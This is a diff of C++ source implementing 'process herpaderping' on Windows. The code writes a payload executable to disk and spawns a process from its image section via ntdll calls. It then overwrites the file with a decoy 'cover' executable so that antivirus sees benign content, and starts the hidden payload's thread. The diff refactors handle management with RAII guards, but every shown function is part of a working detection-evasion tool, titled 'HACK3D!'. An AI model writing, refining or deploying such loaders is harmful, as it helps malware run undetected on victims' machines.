@@ -9,16 +9,16 @@ Herpaderping::Herpaderping(std::string path_to_source,
 						   std::string path_to_target, 
 						   std::string path_to_cover,
 						   const wchar_t* windows_station_to_run_on) :
-	windows_station_to_run_on(windows_station_to_run_on),
-	section_handle(),
-	target_process(),
-	target_file(),
-	thread_handle(),
-	source_file_payload(),
-	ntdll_functions(std::make_unique<NtdllFunctions>()),
-	path_to_source(path_to_source),
-	path_to_target(path_to_target),
-	path_to_cover(path_to_cover)
+	m_windows_station_to_run_on(windows_station_to_run_on),
+	m_section_handle(std::make_unique<HandleGuard>()),
+	m_target_process(std::make_unique<HandleGuard>()),
+	m_target_file(std::make_unique<HandleGuard>()),
+	m_thread_handle(std::make_unique<HandleGuard>()),
+	m_source_file_payload(),
+	m_ntdll_functions(std::make_unique<NtdllFunctions>()),
+	m_path_to_source(path_to_source),
+	m_path_to_target(path_to_target),
+	m_path_to_cover(path_to_cover)
 { }
 
 void Herpaderping::run_process_with_cover()
@@ -36,7 +36,7 @@ void Herpaderping::run_process_with_cover()
 
 void Herpaderping::read_source_payload()
 {
-	HANDLE source_file = CreateFileA(this->path_to_source.c_str(),
+	HANDLE source_file = CreateFileA(this->m_path_to_source.c_str(),
 		GENERIC_READ,
 		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
 		nullptr,
@@ -52,28 +52,32 @@ void Herpaderping::read_source_payload()
 		throw std::runtime_error("GetFileSize: failed to retreive source file size. Error: " + error_to_str(GetLastError()));
 	}
 
-	this->source_file_payload = std::make_unique<std::vector<char>>(source_file_size);
-	if (!ReadFile(source_file, source_file_payload.get()->data(), source_file_size, nullptr, nullptr)) {
+	this->m_source_file_payload = std::make_unique<std::vector<char>>(source_file_size);
+	if (!ReadFile(source_file, m_source_file_payload.get()->data(), source_file_size, nullptr, nullptr)) {
 		throw std::runtime_error("ReadFile: failed to read source file. Error: " + error_to_str(GetLastError()));
 	}
 }
 
 void Herpaderping::create_target_file_and_write_payload()
 {
-	this->target_file = CreateFileA(this->path_to_target.c_str(),
+	HANDLE tmp_target_file = nullptr;
+	tmp_target_file = CreateFileA(m_path_to_target.c_str(),
 		GENERIC_READ | GENERIC_WRITE,
 		0,
 		nullptr,
 		CREATE_ALWAYS,
 		FILE_ATTRIBUTE_NORMAL,
 		nullptr);
-	if (INVALID_HANDLE_VALUE == this->target_file) {
+	if (INVALID_HANDLE_VALUE == tmp_target_file) {
 		throw std::runtime_error("CreateFileA: failed to create target file. Error: " + error_to_str(GetLastError()));
 	}
 
-	if (!WriteFile(this->target_file,
-		source_file_payload.get()->data(),
-		source_file_payload.get()->size(),
+	// Handle is valid, set the guard in accordance.
+	m_target_file->set(tmp_target_file);
+
+	if (!WriteFile(m_target_file->get(),
+		m_source_file_payload.get()->data(),
+		m_source_file_payload.get()->size(),
 		nullptr,
 		nullptr)) {
 		throw std::runtime_error("WriteFile: failed to write source file to target file. Error: " + error_to_str(GetLastError()));
@@ -83,34 +87,40 @@ void Herpaderping::create_target_file_and_write_payload()
 void Herpaderping::create_target_process()
 {
 	// Create a section with this->target_file as its image.
-	NTSTATUS create_section_return_value = ntdll_functions->NtCreateSection(&section_handle,
+	HANDLE tmp_section_handle = nullptr;
+	NTSTATUS create_section_return_value = m_ntdll_functions->NtCreateSection(&tmp_section_handle,
 		SECTION_ALL_ACCESS,
 		nullptr,
 		nullptr,
 		PAGE_READONLY,
 		SEC_IMAGE,
-		target_file);
+		m_target_file->get());
 	if (create_section_return_value) {
 		throw std::runtime_error("NtCreateSection: failed to create section. Error: " + error_to_str(create_section_return_value));
 	}
 
+	m_section_handle->set(tmp_section_handle);
+
 	// Create a process with the section created above.
 	// TODO: return value?
-	ntdll_functions->NtCreateProcessEx(&target_process,
+	HANDLE tmp_process_handle = nullptr;
+	m_ntdll_functions->NtCreateProcessEx(&tmp_process_handle,
 		PROCESS_ALL_ACCESS,
 		nullptr,
 		GetCurrentProcess(),
 		PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
-		section_handle,
+		m_section_handle->get(),
 		nullptr,
 		nullptr,
 		FALSE);
+
+	m_target_process->set(tmp_process_handle);
 }
 
 void Herpaderping::cover_target_file()
 {
 	// Open and read target executable file.
-	HANDLE cover_file_handle = CreateFileA(this->path_to_cover.c_str(),
+	HANDLE cover_file_handle = CreateFileA(this->m_path_to_cover.c_str(),
 		GENERIC_READ,
 		0,
 		nullptr,
@@ -132,12 +142,12 @@ void Herpaderping::cover_target_file()
 	}
 
 	// Seek to the beginning of the target executable.
-	if (INVALID_SET_FILE_POINTER == SetFilePointer(this->target_file, 0, nullptr, FILE_BEGIN)) {
+	if (INVALID_SET_FILE_POINTER == SetFilePointer(m_target_file->get(), 0, nullptr, FILE_BEGIN)) {
 		throw std::runtime_error("SetFilePointer: failed to set target file pointer. Error: " + error_to_str(GetLastError()));
 	}
 
 	// Overwrite the target executable with the content of the cover executable.
-	if (!WriteFile(this->target_file, cover_file_content.get()->data(), cover_file_size, nullptr, nullptr)) {
+	if (!WriteFile(m_target_file->get(), cover_file_content.get()->data(), cover_file_size, nullptr, nullptr)) {
 		throw std::runtime_error("WriteFile: failed to overwrite target file. Error: " + error_to_str(GetLastError()));
 	}
 }
@@ -153,7 +163,7 @@ void Herpaderping::create_and_run_target_main_thread()
 	PEB64 current_process_peb;
 	
 	// TODO: return value?
-	ntdll_functions->NtQueryInformationProcess(GetCurrentProcess(), 
+	m_ntdll_functions->NtQueryInformationProcess(GetCurrentProcess(), 
 		ProcessBasicInformation, 
 		&current_process_pbi,
 		sizeof(current_process_pbi), 
@@ -162,12 +172,12 @@ void Herpaderping::create_and_run_target_main_thread()
 	current_process_peb = *reinterpret_cast<PEB64*>(current_process_pbi.PebBaseAddress);
 
 	// Initialize relevant parameters.
-	ntdll_functions->RtlInitUnicodeString(&image_path_name, string_to_wstring(path_to_target).c_str());
-	ntdll_functions->RtlInitUnicodeString(&command_line, string_to_wstring("\"" + path_to_target + "\"").c_str());
-	ntdll_functions->RtlInitUnicodeString(&title, L"HACK3D!");
-	ntdll_functions->RtlInitUnicodeString(&desktop_info, windows_station_to_run_on);
+	m_ntdll_functions->RtlInitUnicodeString(&image_path_name, string_to_wstring(m_path_to_target).c_str());
+	m_ntdll_functions->RtlInitUnicodeString(&command_line, string_to_wstring("\"" + m_path_to_target + "\"").c_str());
+	m_ntdll_functions->RtlInitUnicodeString(&title, L"HACK3D!");
+	m_ntdll_functions->RtlInitUnicodeString(&desktop_info, m_windows_station_to_run_on);
 
-	ntdll_functions->RtlCreateProcessParametersEx(&process_parameters,
+	m_ntdll_functions->RtlCreateProcessParametersEx(&process_parameters,
 		&image_path_name,
 		nullptr,
 		nullptr,
@@ -180,14 +190,14 @@ void Herpaderping::create_and_run_target_main_thread()
 		0);
 
 	PROCESS_BASIC_INFORMATION pbi;
-	ntdll_functions->NtQueryInformationProcess(this->target_process,
+	m_ntdll_functions->NtQueryInformationProcess(m_target_process->get(),
 		ProcessBasicInformation, 
 		&pbi, 
 		sizeof(pbi), 
 		nullptr);
 
 	// Allocate space for the parameters in our created process.
-	auto process_allocated_space = VirtualAllocEx(this->target_process,
+	auto process_allocated_space = VirtualAllocEx(m_target_process->get(),
 		nullptr,
 		process_parameters->MaximumLength + process_parameters->EnvironmentSize,
 		MEM_COMMIT | MEM_RESERVE,
@@ -199,7 +209,7 @@ void Herpaderping::create_and_run_target_main_thread()
 	process_parameters->Environment = reinterpret_cast<PBYTE>(process_allocated_space) + process_parameters->Length;
 
 	// Write process parameters to the process.
-	if (!WriteProcessMemory(this->target_process,
+	if (!WriteProcessMemory(m_target_process->get(),
 		process_allocated_space,
 		process_parameters,
 		process_parameters->MaximumLength + process_parameters->EnvironmentSize,
@@ -208,7 +218,7 @@ void Herpaderping::create_and_run_target_main_thread()
 	}
 
 	// Update the ProcessParameters in the process PEB to point to our parameters.
-	if (!WriteProcessMemory(this->target_process,
+	if (!WriteProcessMemory(m_target_process->get(),
 		reinterpret_cast<unsigned char*>(pbi.PebBaseAddress) + offsetof(PEB64, ProcessParameters),
 		&process_allocated_space,
 		sizeof(process_allocated_space),
@@ -216,12 +226,12 @@ void Herpaderping::create_and_run_target_main_thread()
 		throw std::runtime_error("WriteProcessMemory: failed to update target process's PEB. Error: " + error_to_str(GetLastError()));
 	}
 
-	const PIMAGE_DOS_HEADER payload_dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(this->source_file_payload.get()->data());
-	const PIMAGE_NT_HEADERS64 payload_nt_header = reinterpret_cast<PIMAGE_NT_HEADERS64>(this->source_file_payload.get()->data() + payload_dos_header->e_lfanew);
+	const PIMAGE_DOS_HEADER payload_dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(this->m_source_file_payload.get()->data());
+	const PIMAGE_NT_HEADERS64 payload_nt_header = reinterpret_cast<PIMAGE_NT_HEADERS64>(this->m_source_file_payload.get()->data() + payload_dos_header->e_lfanew);
 
 	// Read createed process memory to find base address.
 	PEB64 process_peb;
-	if (!ReadProcessMemory(this->target_process,
+	if (!ReadProcessMemory(m_target_process->get(),
 		pbi.PebBaseAddress,
 		&process_peb,
 		sizeof(process_peb),
@@ -232,19 +242,19 @@ void Herpaderping::create_and_run_target_main_thread()
 	// Calculate the absolute address of the entry point.
 	ULONGLONG entry_point = process_peb.ImageBaseAddress + payload_nt_header->OptionalHeader.AddressOfEntryPoint;
 
-	ntdll_functions->NtCreateThreadEx(&thread_handle,
+	HANDLE tmp_thread_handle = nullptr;
+	m_ntdll_functions->NtCreateThreadEx(&tmp_thread_handle,
 		THREAD_ALL_ACCESS,
 		nullptr,
-		this->target_process,
+		m_target_process->get(),
 		reinterpret_cast<PVOID>(entry_point),
 		nullptr,
-		0,
-		0,
-		0,
-		0,
+		0, 0, 0, 0,
 		nullptr);
-	if (NULL == thread_handle) {
+	if (NULL == tmp_thread_handle) {
 		throw std::runtime_error("NtCreateThreadEx: failed to create target process' main thread. Error: " + error_to_str(GetLastError()));
 	}
+
+	m_thread_handle->set(tmp_thread_handle);
 }
  
